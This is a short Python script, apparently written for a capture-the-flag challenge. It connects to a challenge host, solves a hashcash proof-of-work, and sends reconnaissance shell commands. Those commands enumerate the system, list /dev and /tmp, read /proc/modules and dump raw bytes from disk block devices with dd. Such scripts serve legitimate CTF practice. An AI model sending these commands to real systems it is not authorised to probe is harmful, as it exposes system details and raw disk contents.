import re
import socket
import subprocess
import time

HOST = "ctf.vulnbydefault.com"
PORT = 30218


def recv_some(sock, rounds=16, delay=0.15):
    data = b""
    for _ in range(rounds):
        try:
            chunk = sock.recv(8192)
        except TimeoutError:
            time.sleep(delay)
            continue
        except Exception:
            break
        if not chunk:
            break
        data += chunk
        if len(chunk) < 8192:
            time.sleep(delay)
    return data


def main():
    sock = socket.create_connection((HOST, PORT), timeout=10)
    sock.settimeout(3)

    banner = sock.recv(4096)
    print(banner.decode("latin1", "ignore"), end="")
    m = re.search(rb"hashcash -mb32 ([^\s\r\n]+)", banner)
    if not m:
        raise SystemExit("Could not parse PoW resource")

    resource = m.group(1).decode()
    stamp = subprocess.check_output(["hashcash", "-mb32", resource], text=True).strip()
    print(f"[+] resource: {resource}")
    print(f"[+] stamp: {stamp}")
    sock.sendall(stamp.encode() + b"\n")

    time.sleep(0.5)
    print(recv_some(sock).decode("latin1", "ignore"), end="")

    cmds = (
        "id; uname -a; "
        "ls -la /; "
        "ls -la /dev | head -n 120; "
        "ls -la /tmp; "
        "cat /proc/modules | head -n 40; "
        "echo '---try-dev-read---'; "
        "for d in /dev/sd* /dev/vd* /dev/hd*; do [ -e \"$d\" ] && (echo \"### $d\"; dd if=$d bs=1 count=128 2>/dev/null | xxd -g 1 -c 32); done; "
        "echo '---done---'\n"
    )
    sock.sendall(cmds.encode())
    time.sleep(1.0)
    out = recv_some(sock, rounds=40, delay=0.2)
    print(out.decode("latin1", "ignore"), end="")
    sock.close()


if __name__ == "__main__":
    main()
